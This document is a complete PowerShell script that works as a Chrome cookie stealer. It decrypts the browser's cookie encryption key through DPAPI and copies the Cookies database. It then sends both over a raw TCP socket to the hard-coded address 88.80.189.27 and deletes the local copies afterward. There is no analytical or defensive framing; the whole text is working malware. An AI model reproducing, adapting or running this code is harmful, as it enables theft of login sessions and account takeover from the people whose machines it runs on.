Add-Type -AssemblyName System.Security; function GetEncryptionKey { $localStatePath = Join-Path $env:USERPROFILE 'AppData\Local\Google\Chrome\User Data\Local State'; $localState = Get-Content $localStatePath -Raw | ConvertFrom-Json; $key = [System.Convert]::FromBase64String($localState.os_crypt.encrypted_key); $key = $key[5..($key.Length - 1)]; $decryptedKey = [System.Security.Cryptography.ProtectedData]::Unprotect($key,$null,'CurrentUser'); $filePath = Join-Path $env:TEMP 'encryption_key.bin'; [System.IO.File]::WriteAllBytes($filePath,$decryptedKey); return $decryptedKey }; function GetCookies { $dbPath = Join-Path $env:USERPROFILE 'AppData\Local\Google\Chrome\User Data\Default\Network\Cookies'; $filename = 'Cookies.db'; if (-not (Test-Path $filename)) { Copy-Item $dbPath $filename } }; function SendCookies { $ipAddress = '88.80.189.27'; $port = 80; $CookieFile = Join-Path (Get-Location) 'Cookies.db'; $KeyFile = Join-Path $env:TEMP 'encryption_key.bin'; $client = New-Object System.Net.Sockets.TcpClient ($ipAddress,$port); $stream = $client.GetStream(); $cookies = [System.IO.File]::ReadAllBytes($CookieFile); $cookiesSize = $cookies.Length; $cookiesSizeBytes = [BitConverter]::GetBytes($cookiesSize); $stream.Write($cookiesSizeBytes, 0, $cookiesSizeBytes.Length); $stream.Write($cookies, 0, $cookies.Length); $key = [System.IO.File]::ReadAllBytes($KeyFile); $keySize = $key.Length; $keySizeBytes = [BitConverter]::GetBytes($keySize); $stream.Write($keySizeBytes, 0, $keySizeBytes.Length); $stream.Write($key, 0, $key.Length); $client.Close(); Start-Sleep -s 1; Remove-Item $CookieFile; Remove-Item $KeyFile }; GetEncryptionKey; GetCookies; SendCookies